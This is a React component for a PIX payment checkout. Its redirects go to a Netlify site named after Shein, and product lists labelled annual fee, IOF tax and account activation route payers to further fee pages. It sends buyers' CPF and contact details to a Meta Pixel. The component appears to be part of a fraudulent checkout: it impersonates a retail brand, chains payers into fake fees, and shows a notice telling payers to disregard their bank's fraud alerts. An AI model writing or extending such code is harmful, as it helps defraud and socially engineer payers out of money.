import { useState, useEffect, useCallback, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Copy, Check, Clock, QrCode, RefreshCw, Loader2, AlertTriangle, ChevronDown, ChevronUp } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import BANKS from "./BankLogos";
import { checkPaymentStatus } from "@/lib/checkout-api";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { initMetaPixel, trackPurchase } from "@/lib/meta-pixel";
import {
  HEADER_TIMER_PRODUCT_IDS,
  ATIVAR_CONTA_PRODUCT_IDS,
  IOF_WARNING_PRODUCT_IDS,
  TAXA_ANUAL_PRODUCT_IDS,
} from "@/config/warningProducts";

interface PixPaymentProps {
  pixData: {
    payment_id: string;
    qr_code_base64: string;
    copia_e_cola: string;
    expires_at: string;
    status: string;
    event_id?: string;
  } | null;
  loading: boolean;
  onGeneratePix: () => void;
  email: string;
  cpf: string;
  total?: number;
  fullName?: string;
  phone?: string;
  city?: string;
  state?: string;
  zipCode?: string;
  items?: Array<{ id: string; name: string; qty: number; price: number }>;
}




const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullName, phone, city, state, zipCode, items: orderItems }: PixPaymentProps) => {
  const { toast } = useToast();
  const navigate = useNavigate();
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState({ min: "15", sec: "00" });
  const [expired, setExpired] = useState(false);
  const pixGeneratedAtRef = useRef<number | null>(null);
  const [status, setStatus] = useState(pixData?.status || "");
  const [checking, setChecking] = useState(false);
  const [showAllBanks, setShowAllBanks] = useState(false);
  const [showQrCode, setShowQrCode] = useState(false);
  const pixCodeRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    if (!pixData) return;
    // Marca o instante em que o PIX foi gerado (uma única vez por pixData)
    if (pixGeneratedAtRef.current === null) {
      pixGeneratedAtRef.current = Date.now();
    }
    const generatedAt = pixGeneratedAtRef.current;
    // Use expires_at from API only if it's in the future; otherwise fallback to 15 min from now
    const apiExpires = pixData.expires_at ? new Date(pixData.expires_at).getTime() : 0;
    const fallback = generatedAt + 15 * 60 * 1000;
    const expiresAt = apiExpires > Date.now() ? apiExpires : fallback;

    setExpired(false);
    const update = () => {
      const diff = expiresAt - Date.now();
      if (diff <= 0) {
        setExpired(true);
        setTimeLeft({ min: "00", sec: "00" });
        return false;
      }
      const m = Math.floor(diff / 60000);
      const s = Math.floor((diff % 60000) / 1000);
      setTimeLeft({ min: m.toString().padStart(2, "0"), sec: s.toString().padStart(2, "0") });
      return true;
    };
    update();

    const timer = setInterval(() => {
      if (!update()) clearInterval(timer);
    }, 1000);
    return () => clearInterval(timer);
  }, [pixData?.payment_id, pixData?.expires_at]);

  // Scroll até o "Código PIX" assim que o PIX é gerado — respeita header sticky
  useEffect(() => {
    if (!pixData) return;
    const scrollToPix = () => {
      const el = pixCodeRef.current;
      if (!el) return;
      const header = document.querySelector("header");
      const headerHeight = header instanceof HTMLElement ? header.offsetHeight : 0;
      const offset = headerHeight + 16; // respiro extra
      const top = el.getBoundingClientRect().top + window.scrollY - offset;
      window.scrollTo({ top: Math.max(0, top), behavior: "smooth" });
    };
    // Dois frames para garantir layout final (mobile + header sticky com warning)
    const t = setTimeout(() => requestAnimationFrame(scrollToPix), 300);
    return () => clearTimeout(t);
  }, [pixData?.payment_id]);

  useEffect(() => {
    if (pixData) setStatus(pixData.status);
  }, [pixData]);

  // Auto-poll payment status every 5 seconds + check on tab focus (mobile)
  useEffect(() => {
    if (!pixData?.payment_id || status === "approved") return;

    console.log("Starting payment polling for:", pixData.payment_id);

    const doRedirect = async (opts: { requireApproved: boolean }) => {
      const pid = pixData?.payment_id;
      if (!pid) {
        console.warn("[guard] redirect bloqueado: payment_id ausente");
        return;
      }

      // GUARD: valida o pedido no banco antes de limpar estado e avançar
      const { data: order, error } = await supabase
        .from("orders")
        .select("id, mp_payment_id, payment_status")
        .eq("mp_payment_id", pid)
        .maybeSingle();

      if (error || !order) {
        console.warn("[guard] redirect bloqueado: pedido não encontrado", { pid, error });
        toast({
          title: "Aguardando confirmação",
          description: "Não foi possível validar o pedido. Tente novamente em instantes.",
          variant: "destructive",
        });
        return;
      }

      if (opts.requireApproved && order.payment_status !== "approved") {
        console.warn("[guard] redirect bloqueado: status != approved", order.payment_status);
        return;
      }

      // Validação OK — agora sim, limpa rascunho/timer e redireciona
      const ids = (orderItems || []).map((i) => i.id);
      try {
        localStorage.removeItem("checkout_form_draft");
        localStorage.removeItem("checkout_deadline_ts");
      } catch {}
      if (ids.some((id) => TAXA_ANUAL_PRODUCT_IDS.includes(id))) {
        window.location.href = "https://shein-brasilup.netlify.app/banking";
      } else if (ids.some((id) => IOF_WARNING_PRODUCT_IDS.includes(id))) {
        window.location.href = "https://shein-brasilup.netlify.app/up3";
      } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
        window.location.href = "https://shein-brasilup.netlify.app/imposto";
      } else {
        window.location.href = "https://shein-brasilup.netlify.app/ativacao/";
      }
    };

    const poll = async () => {
      try {
        const res = await checkPaymentStatus(pixData.payment_id);
        console.log("Poll result:", res.status);
        if (res.status === "approved") {
          setStatus("approved");
          // Dispara Purchase no Meta Pixel apenas na confirmação real
          if (orderItems?.length) {
            try {
              initMetaPixel();
              trackPurchase({
                content_ids: orderItems.map((i) => i.id),
                contents: orderItems.map((i) => ({ id: i.id, quantity: i.qty, item_price: i.price })),
                content_type: "product",
                currency: "BRL",
                num_items: orderItems.reduce((s, i) => s + i.qty, 0),
                value: total || 0,
                email,
                phone,
                cpf,
                first_name: fullName,
                city,
                state,
                zip_code: zipCode,
                order_id: pixData.payment_id,
                payment_method: "pix",
                event_id: pixData.event_id,
              });
            } catch (e) {
              console.error("trackPurchase error:", e);
            }
          }
          toast({
            title: "✅ Pagamento confirmado!",
            description: "Redirecionando...",
          });
          await doRedirect({ requireApproved: true });
        }
      } catch (err) {
        console.error("Polling error:", err);
      }
    };



    // Check immediately when user returns to the tab (critical for mobile)
    const handleVisibility = () => {
      if (document.visibilityState === "visible") {
        console.log("Tab became visible, checking payment...");
        poll();
      }
    };

    // Also check on window focus (some browsers use this instead)
    const handleFocus = () => {
      console.log("Window focused, checking payment...");
      poll();
    };

    document.addEventListener("visibilitychange", handleVisibility);
    window.addEventListener("focus", handleFocus);

    // Initial check immediately
    poll();

    const interval = setInterval(poll, 5000);
    return () => {
      clearInterval(interval);
      document.removeEventListener("visibilitychange", handleVisibility);
      window.removeEventListener("focus", handleFocus);
    };
  }, [pixData?.payment_id, status, navigate, toast]);

  const handleCopy = useCallback(async () => {
    if (!pixData) return;
    const code = pixData.copia_e_cola || pixData.qr_code_base64;
    await navigator.clipboard.writeText(code);
    setCopied(true);
    toast({
      title: "✅ Código PIX copiado!",
      description: "Agora cole no app do seu banco para finalizar o pagamento.",
    });
    setTimeout(() => setCopied(false), 2500);
  }, [pixData]);

  const handleCheckStatus = useCallback(async () => {
    if (!pixData) return;
    setChecking(true);
    const res = await checkPaymentStatus(pixData.payment_id);
    setStatus(res.status);
    setChecking(false);
  }, [pixData]);

  const handleProofUploaded = useCallback(() => {
    if (!pixData || !orderItems?.length) return;
    // Dispara Purchase quando o cliente envia o comprovante pelo WhatsApp.
    initMetaPixel();
    trackPurchase({
      content_ids: orderItems.map((i) => i.id),
      contents: orderItems.map((i) => ({ id: i.id, quantity: i.qty, item_price: i.price })),
      content_type: "product",
      currency: "BRL",
      num_items: orderItems.reduce((s, i) => s + i.qty, 0),
      value: total || 0,
      email,
      phone,
      cpf,
      first_name: fullName,
      city,
      state,
      zip_code: zipCode,
      order_id: pixData.payment_id,
      payment_method: "pix",
      event_id: pixData.event_id,
    });

    // Redireciona após envio do comprovante, com guard de validação no banco
    setTimeout(async () => {
      const pid = pixData.payment_id;

      // GUARD: garante que o pedido existe antes de limpar o estado
      const { data: order, error } = await supabase
        .from("orders")
        .select("id, mp_payment_id")
        .eq("mp_payment_id", pid)
        .maybeSingle();

      if (error || !order) {
        console.warn("[guard] redirect (comprovante) bloqueado: pedido não encontrado", { pid, error });
        toast({
          title: "Comprovante enviado",
          description: "Aguardando validação do pedido. Mantenha esta tela aberta.",
        });
        return;
      }

      try {
        localStorage.removeItem("checkout_form_draft");
        localStorage.removeItem("checkout_deadline_ts");
      } catch {}
      const ids = (orderItems || []).map((i) => i.id);
      if (ids.some((id) => TAXA_ANUAL_PRODUCT_IDS.includes(id))) {
        window.location.href = "https://shein-brasilup.netlify.app/banking";
      } else if (ids.some((id) => IOF_WARNING_PRODUCT_IDS.includes(id))) {
        window.location.href = "https://shein-brasilup.netlify.app/up3";
      } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
        window.location.href = "https://shein-brasilup.netlify.app/imposto";
      } else {
        window.location.href = "https://shein-brasilup.netlify.app/ativacao/";
      }
    }, 1500);
  }, [pixData, orderItems, total, email, phone, cpf, fullName, city, state, zipCode, navigate]);

  // Pre-generation state
  if (!pixData) {
    return (
      <div className="space-y-4">
        <div className="rounded-xl border border-dashed border-border bg-checkout-highlight p-6 text-center">
          <QrCode className="mx-auto mb-3 h-12 w-12 text-primary opacity-40" />
          <p className="mb-1 text-sm font-medium text-foreground">
            Pague instantaneamente com PIX
          </p>
          <p className="mb-4 text-xs text-muted-foreground">
            O QR Code será gerado após confirmar seus dados
          </p>
          <div className="space-y-2 text-left text-xs text-muted-foreground">
            <p><strong>1.</strong> Clique em "Gerar PIX"</p>
            <p><strong>2.</strong> Copie o código ou escaneie o QR Code</p>
            <p><strong>3.</strong> Pague no app do seu banco</p>
          </div>
        </div>
        <Button
          onClick={onGeneratePix}
          disabled={loading}
          className="w-full bg-accent text-accent-foreground hover:bg-accent/90 h-12 text-base font-semibold"
        >
          {loading ? (
            <span className="flex items-center gap-2">
              <Loader2 className="h-4 w-4 animate-spin" />
              Gerando PIX...
            </span>
          ) : (
            "Gerar PIX"
          )}
        </Button>
      </div>
    );
  }

  const pixCode = pixData.copia_e_cola || pixData.qr_code_base64;
  const formattedTotal = total ? `R$ ${total.toFixed(2).replace(".", ",")}` : "";
  const totalSeconds = Number(timeLeft.min) * 60 + Number(timeLeft.sec);
  const progressPct = Math.max(0, Math.min(100, ((900 - totalSeconds) / 900) * 100));
  const timerCritical = totalSeconds > 0 && totalSeconds <= 120;

  return (
    <div className="space-y-5">
      {/* Hero: total */}
      <div className="relative overflow-hidden rounded-2xl border border-primary/10 bg-gradient-to-br from-primary to-[hsl(var(--primary-hover))] p-5 text-primary-foreground checkout-shadow-md">
        <p className="text-[11px] font-medium uppercase tracking-wider text-primary-foreground/70">
          Total do pedido
        </p>
        <p className="mt-0.5 text-2xl sm:text-3xl font-bold tabular-nums tracking-tight">
          {formattedTotal || "—"}
        </p>
      </div>

      {/* PIX Code + Copy CTA */}
      <div ref={pixCodeRef} className="scroll-mt-32 sm:scroll-mt-24 space-y-2">
        <div className="flex items-center justify-between">
          <p className="text-sm font-semibold text-foreground">Código PIX (copia e cola)</p>
          <span className="rounded-full bg-accent/10 px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wide text-accent">
            Rápido
          </span>
        </div>
        <div className="rounded-xl border border-dashed border-border bg-muted/40 px-3 py-2.5">
          <p className="truncate text-xs text-muted-foreground font-mono select-all" title={pixCode}>
            {pixCode}
          </p>
        </div>
        <Button
          onClick={handleCopy}
          className={`h-12 w-full gap-2 text-base font-semibold transition-all ${
            copied
              ? "bg-accent text-accent-foreground hover:bg-accent/90"
              : "bg-primary text-primary-foreground hover:bg-primary/90"
          }`}
        >
          {copied ? (
            <>
              <Check className="h-5 w-5" />
              Código copiado!
            </>
          ) : (
            <>
              <Copy className="h-5 w-5" />
              Copiar código PIX
            </>
          )}
        </Button>
      </div>

      {/* QR Code (collapsible) */}
      <div>
        <button
          onClick={() => setShowQrCode(!showQrCode)}
          className="flex w-full items-center justify-between rounded-xl border border-border bg-card px-4 py-3 text-left transition-colors hover:bg-muted/50"
        >
          <div className="flex items-center gap-2">
            <QrCode className="h-4 w-4 text-primary" />
            <span className="text-sm font-medium text-foreground">
              {showQrCode ? "Ocultar QR Code" : "Ou pague com QR Code"}
            </span>
          </div>
          {showQrCode ? <ChevronUp className="h-4 w-4 text-muted-foreground" /> : <ChevronDown className="h-4 w-4 text-muted-foreground" />}
        </button>
        {showQrCode && (
          <div className="mt-3 flex flex-col items-center gap-2 animate-fade-in">
            <div className="rounded-2xl border border-border p-3 bg-card checkout-shadow">
              {pixCode ? (
                <QRCodeSVG
                  value={pixCode}
                  size={200}
                  level="M"
                  includeMargin
                />
              ) : (
                <div className="flex h-[200px] w-[200px] items-center justify-center">
                  <QrCode className="h-20 w-20 text-muted-foreground/30" />
                </div>
              )}
            </div>
            <p className="text-xs text-muted-foreground">Aponte a câmera do seu celular</p>
          </div>
        )}
      </div>

      {/* Security Warning */}
      {!orderItems?.some((i) => i.id === "3992d6d7-f608-4b8a-9191-c053eda9a673") && (
        <div className="rounded-xl border border-[hsl(var(--checkout-warning))]/40 bg-[hsl(var(--checkout-warning))]/10 p-3 sm:p-4">
          <div className="flex items-start gap-3">
            <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[hsl(var(--checkout-warning))]">
              <AlertTriangle className="h-4 w-4 text-primary-foreground" />
            </div>
            <div>
              <p className="text-sm font-semibold text-foreground">Atenção ao pagar</p>
              <p className="mt-1 text-xs text-muted-foreground">
                Os bancos reforçaram a segurança do Pix e podem exibir alertas preventivos durante o pagamento.{" "}
                <strong className="text-foreground">Fique tranquilo — sua transação é segura e está totalmente protegida.</strong>
              </p>
            </div>
          </div>
        </div>
      )}

      <div className="rounded-xl border border-border bg-card p-4 checkout-shadow">
        <p className="mb-3 text-sm font-semibold text-foreground">Como pagar em 30 segundos</p>
        <div className="space-y-3">
          {[
            "Toque em Copiar código PIX acima",
            "Acesse o app do seu banco",
            "Vá em PIX › Pix Copia e Cola",
            "Cole o código e confirme o pagamento",
          ].map((text, i) => (
            <div key={i} className="flex items-start gap-3">
              <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-bold text-primary">
                {i + 1}
              </span>
              <p className="text-sm text-foreground leading-relaxed">{text}</p>
            </div>
          ))}
        </div>
      </div>




      {/* Bank logos */}
      <div>
        <p className="mb-3 text-sm font-semibold text-foreground">Pague com seu banco:</p>
        <div className="space-y-2">
          {BANKS.slice(0, showAllBanks ? BANKS.length : 4).map((bank) => (
            <button
              key={bank.name}
              onClick={handleCopy}
              className="flex w-full items-center gap-3 rounded-lg border border-border bg-card px-4 py-3 text-left transition-colors hover:bg-muted/50 active:bg-muted"
            >
              <img
                src={bank.logo}
                alt={bank.name}
                className="h-8 w-auto max-w-[80px] shrink-0 object-contain"
              />
              <div className="flex-1">
                <p className="text-sm font-medium text-foreground">{bank.name}</p>
                <p className="text-[10px] text-muted-foreground">Pode precisar colar manualmente</p>
              </div>
              <Copy className="h-4 w-4 text-muted-foreground" />
            </button>
          ))}
        </div>
        <button
          onClick={() => setShowAllBanks(!showAllBanks)}
          className="mt-2 flex w-full items-center justify-center gap-1 text-xs font-medium text-primary hover:underline"
        >
          {showAllBanks ? (
            <>Ver menos <ChevronUp className="h-3 w-3" /></>
          ) : (
            <>Ver todos os bancos <ChevronDown className="h-3 w-3" /></>
          )}
        </button>
      </div>

      {/* Status footer */}
      <div className="flex items-center justify-center gap-2 rounded-lg border border-border bg-muted/50 px-4 py-3">
        <Loader2 className="h-4 w-4 animate-spin text-primary" />
        <span className="text-sm text-muted-foreground">Aguardando pagamento...</span>
      </div>
    </div>
  );
};

export default PixPayment;
